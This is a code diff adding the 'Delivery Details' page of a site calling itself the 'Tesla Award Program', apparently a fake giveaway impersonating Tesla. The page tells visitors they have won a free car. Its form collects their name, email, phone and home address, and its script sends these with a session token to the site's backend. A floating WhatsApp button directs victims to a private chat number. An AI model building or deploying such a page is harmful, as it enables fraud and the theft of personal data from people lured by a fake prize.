@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Delivery Details — Tesla Award Program</title>
+    <meta name="description" content="Provide your delivery address and contact information so we can deliver your Tesla award vehicle to the right location.">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://joshbond123.github.io/Tesla/delivery-details.html">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://joshbond123.github.io/Tesla/delivery-details.html">
+    <meta property="og:title" content="Delivery Details — Tesla Award Program">
+    <meta property="og:description" content="Provide your delivery address and contact information so we can deliver your Tesla award vehicle to the right location.">
+    <meta property="og:image" content="https://joshbond123.github.io/Tesla/assets/tesla-logo.png">
+    <meta property="og:image:width" content="512">
+    <meta property="og:image:height" content="512">
+    <meta property="og:site_name" content="Tesla Award Program">
+    <meta property="og:locale" content="en_US">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://joshbond123.github.io/Tesla/delivery-details.html">
+    <meta name="twitter:title" content="Delivery Details — Tesla Award Program">
+    <meta name="twitter:description" content="Provide your delivery address and contact information so we can deliver your Tesla award vehicle to the right location.">
+    <meta name="twitter:image" content="https://joshbond123.github.io/Tesla/assets/tesla-logo.png">
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="dns-prefetch" href="https://unpkg.com">
+    <link rel="dns-prefetch" href="https://puebwzumwqizgbmksrpq.supabase.co">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    body{background:var(--light);}
+    .page-wrap{max-width:700px;margin:0 auto;padding:88px 24px 64px;}
+    .page-card{background:white;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.09);border:1.5px solid rgba(0,0,0,.05);padding:48px;}
+    @media(max-width:560px){.page-card{padding:28px 20px;border-radius:18px;}}
+    .page-title{font-size:26px;font-weight:800;color:var(--dark);text-align:center;margin-bottom:8px;}
+    .page-sub{font-size:15px;color:var(--gray-2);text-align:center;line-height:1.65;margin-bottom:32px;}
+    .crumbs{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--gray-2);margin-bottom:32px;justify-content:center;flex-wrap:wrap;}
+    .crumb-done{color:var(--success);font-weight:600}
+    .crumb-active{color:var(--red);font-weight:700}
+    .crumb-sep{color:var(--border)}
+    .selected-car-box{display:flex;align-items:center;gap:16px;background:var(--light);border-radius:16px;padding:16px 20px;margin-bottom:28px;border:1px solid rgba(0,0,0,.04)}
+    .selected-car-box img{height:70px;object-fit:contain}
+    .selected-car-box .car-info{flex:1}
+    .selected-car-box .car-name{font-size:17px;font-weight:800;color:var(--dark)}
+    .selected-car-box .car-price{display:flex;align-items:center;gap:8px;margin-top:4px}
+    .selected-car-box .car-price .strike{text-decoration:line-through;color:rgba(0,0,0,.4);font-size:13px}
+    .selected-car-box .car-price .free{font-size:11px;font-weight:800;background:var(--red);color:#fff;padding:2px 8px;border-radius:4px}
+    .change-link{font-size:13px;color:var(--red);font-weight:600;text-decoration:none;white-space:nowrap}
+    .change-link:hover{text-decoration:underline}
+    .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+    @media(max-width:580px){.form-grid{grid-template-columns:1fr}}
+    .form-full{grid-column:1/-1}
+        .note-box{background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.15);border-radius:12px;padding:14px 18px;margin-top:20px;font-size:13px;color:#3B82F6;line-height:1.6;display:flex;align-items:flex-start;gap:10px}
+    .note-box svg{flex-shrink:0;margin-top:1px}
+  
+    /* Floating WhatsApp Button */
+    .whatsapp-float {
+      position: fixed;
+      bottom: 28px;
+      right: 28px;
+      z-index: 99999;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+    .whatsapp-float .whatsapp-label {
+      background: white;
+      color: #171a20;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 7px 12px;
+      border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+      white-space: nowrap;
+      text-align: center;
+      line-height: 1.3;
+    }
+    .whatsapp-float-btn {
+      width: 54px;
+      height: 54px;
+      background: #25D366;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 20px rgba(37,211,102,0.3);
+      transition: transform 0.25s ease, box-shadow 0.25s ease;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .whatsapp-float-btn:hover {
+      transform: scale(1.06);
+      box-shadow: 0 6px 24px rgba(37,211,102,0.45);
+    }
+    .whatsapp-float-btn svg {
+      width: 28px;
+      height: 28px;
+    }
+    @media (max-width: 600px) {
+      .whatsapp-float { right: 16px; }
+      .whatsapp-float-btn { width: 48px; height: 48px; border-radius: 14px; }
+      .whatsapp-float-btn svg { width: 24px; height: 24px; }
+      .whatsapp-float .whatsapp-label { font-size: 11px; padding: 6px 10px; }
+    }
+
+</style>
+  <link rel="icon" type="image/png" href="assets/tesla-logo.png">
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "Tesla Award Program",
+      "url": "https://joshbond123.github.io/Tesla",
+      "logo": "https://joshbond123.github.io/Tesla/assets/tesla-logo.png",
+      "description": "Independent promotional award program offering free Tesla vehicles to winners worldwide.",
+      "sameAs": []
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebSite",
+      "name": "Tesla Award Program",
+      "url": "https://joshbond123.github.io/Tesla",
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": "https://joshbond123.github.io/Tesla/track.html?tracking={search_term_string}",
+        "query-input": "required name=search_term_string"
+      }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://joshbond123.github.io/Tesla/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Delivery Details",
+          "item": "https://joshbond123.github.io/Tesla/delivery-details.html"
+        }
+      ]
+    }
+    </script>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">
+      <img src="assets/tesla-logo.png" alt="Tesla Award Program" style="height:30px;width:auto;vertical-align:middle" loading="lazy" decoding="async">
+      TESLA
+    </a>
+    <a href="dashboard.html" class="btn btn-ghost" style="font-size:14px;">← Back to Dashboard</a>
+  </div>
+</nav>
+
+<div class="page-wrap">
+  <!-- STEP 1: Delivery Form -->
+  <div id="deliveryFormSection" class="page-card anim-fade-up">
+    <h1 class="page-title">📦 Delivery Details</h1>
+    <p class="page-sub">Enter your delivery information. All fields marked * are required.</p>
+
+    <!-- Selected car -->
+    <div class="selected-car-box" id="selectedCarBox">
+      <span id="selectedCarEmoji" style="display:none;font-size:48px">🚗</span>
+      <img alt="" id="selectedCarImg" loading="lazy" decoding="async">
+      <div class="car-info">
+        <div class="car-name" id="selectedCarName">Tesla —</div>
+        <div class="car-price">
+          <span class="strike" id="selectedCarPrice">—</span>
+          <span class="free">FREE</span>
+        </div>
+      </div>
+      <a href="dashboard.html" class="change-link">Change</a>
+    </div>
+
+    <form id="deliveryDetailsForm" novalidate>
+      <div class="form-grid">
+        <div class="form-group">
+          <label class="form-label">Full Name *</label>
+          <input class="form-input" type="text" name="fullName" id="fullName" placeholder="James Anderson" required autocomplete="name">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Email Address *</label>
+          <input class="form-input" type="email" name="email" id="email" placeholder="james@email.com" required autocomplete="email">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Phone Number *</label>
+          <input class="form-input" type="tel" name="phone" id="phone" placeholder="+1 (555) 000-0000" required autocomplete="tel">
+        </div>
+        <div class="form-group form-full">
+          <label class="form-label">Street Address *</label>
+          <input class="form-input" type="text" name="address" id="address" placeholder="123 Main Street, Apt 4B" required autocomplete="street-address">
+        </div>
+        <div class="form-group">
+          <label class="form-label">City *</label>
+          <input class="form-input" type="text" name="city" id="city" placeholder="Los Angeles" required autocomplete="address-level2">
+        </div>
+        <div class="form-group">
+          <label class="form-label">State / Province *</label>
+          <input class="form-input" type="text" name="state" id="state" placeholder="California" required autocomplete="address-level1">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Postal / ZIP Code *</label>
+          <input class="form-input" type="text" name="zipCode" id="zipCode" placeholder="90001" required autocomplete="postal-code">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Country *</label>
+          <input class="form-input" type="text" name="country" id="country" placeholder="United States" required autocomplete="country-name">
+        </div>
+      </div>
+
+      <div style="margin-top:24px;">
+        <button type="submit" class="btn btn-primary btn-full btn-lg" id="placeOrderBtn">🚀 Place Order</button>
+      </div>
+    </form>
+  </div>
+
+</div>
+<script src="js/config.js"></script>
+<script src="js/app.js"></script>
+<script src="js/vehicle-data.js"></script>
+<script>
+var selectedCar = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');
+var savedDelivery = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
+
+// If no car selected, redirect to dashboard
+if (!selectedCar) { window.location.href = 'dashboard.html'; }
+
+// Validate that saved progress belongs to the current user session.
+// If the user was deleted and re-registered, clear stale progress.
+
+// Session validation removed — no email verification required
+
+
+// Resume: if delivery already submitted and order exists, redirect to order-placed
+var existingOrder = JSON.parse(localStorage.getItem('tesla_last_order') || 'null');
+if (existingOrder && savedDelivery) {
+  window.location.href = 'order-placed.html';
+}
+
+// Populate car box
+var vi = VEHICLE_DATA[selectedCar.id] || null;
+var carImgSrc = (vi && vi.img) || (selectedCar.img) || '';
+var carImg = document.getElementById('selectedCarImg');
+var carEmoji = document.getElementById('selectedCarEmoji');
+
+// Set up error handler BEFORE setting src (avoids race conditions)
+carImg.onerror = function() {
+  this.style.display = 'none';
+  carEmoji.style.display = 'block';
+};
+carImg.onload = function() {
+  this.style.display = '';
+  carEmoji.style.display = 'none';
+};
+
+if (carImgSrc) {
+  carImg.src = carImgSrc;
+} else {
+  carImg.style.display = 'none';
+  carEmoji.style.display = 'block';
+}
+
+document.getElementById('selectedCarName').textContent = 'Tesla ' + (selectedCar.name || '');
+document.getElementById('selectedCarPrice').textContent = selectedCar.price || '';
+
+// Pre-fill saved delivery
+if (savedDelivery) {
+  document.getElementById('fullName').value = savedDelivery.fullName || '';
+  document.getElementById('email').value = savedDelivery.email || '';
+  document.getElementById('phone').value = savedDelivery.phone || '';
+  document.getElementById('address').value = savedDelivery.address || '';
+  document.getElementById('city').value = savedDelivery.city || '';
+  document.getElementById('state').value = savedDelivery.state || '';
+  document.getElementById('zipCode').value = savedDelivery.zipCode || '';
+  document.getElementById('country').value = savedDelivery.country || '';
+}
+
+// Handle form submission
+document.getElementById('deliveryDetailsForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  var form = e.target;
+  
+  var deliveryDetails = {
+    fullName: (form.fullName.value || '').trim(),
+    email: (form.email.value || '').trim(),
+    phone: (form.phone.value || '').trim(),
+    address: (form.address.value || '').trim(),
+    city: (form.city.value || '').trim(),
+    state: (form.state.value || '').trim(),
+    zipCode: (form.zipCode.value || '').trim(),
+    country: (form.country.value || '').trim()
+  };
+
+  if (!deliveryDetails.fullName || !deliveryDetails.email || !deliveryDetails.address ||
+      !deliveryDetails.city || !deliveryDetails.state || !deliveryDetails.zipCode || !deliveryDetails.country) {
+    showToast('Please fill in all required fields.', 'error');
+    return;
+  }
+
+  // Save progress immediately
+  try {
+    localStorage.setItem('tesla_delivery_details', JSON.stringify(deliveryDetails));
+  } catch(e) {
+    showToast('Unable to save your progress. Please try again.', 'error');
+    return;
+  }
+
+  showLoading('Creating your order...');
+
+  var sessionToken = localStorage.getItem('tesla_session_token') || localStorage.getItem('tesla_session') || (typeof getSession === 'function' ? getSession() : '') || '';
+
+  // Generate order
+  try {
+    var orderData = {
+      sessionToken: sessionToken,
+      selectedCar: selectedCar,
+      deliveryDetails: deliveryDetails,
+      deliveryMethod: null,
+      paymentMethod: null
+    };
+    // Ensure car image is always preserved
+    if (!orderData.selectedCar.img && vi && vi.img) {
+      orderData.selectedCar.img = vi.img;
+    }
+
+    var result = await apiCall('/order', 'POST', orderData);
+
+    // Save order to localStorage for order-placed page to read
+    localStorage.setItem('tesla_last_order', JSON.stringify(result.order));
+
+    // Redirect to Order Placed page
+    hideLoading();
+    window.location.href = 'order-placed.html';
+
+  } catch(err) {
+    hideLoading();
+    showToast(err.message || 'Failed to create order. Please try again.', 'error');
+  }
+});
+</script>
+
+<!-- Floating WhatsApp Support -->
+<div class="whatsapp-float">
+  <span class="whatsapp-label">Need help?<br>Chat with us</span>
+  <a href="https://wa.me/15814783495?text=Hi%2C%20I%20need%20support%20with%20my%20Tesla%20Award%20Program%20order." class="whatsapp-float-btn" target="_blank" rel="noopener noreferrer" title="Chat on WhatsApp">
+    <svg viewBox="0 0 24 24" fill="white">
+      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+    </svg>
+  </a>
+</div>
+
+</body>
+</html>
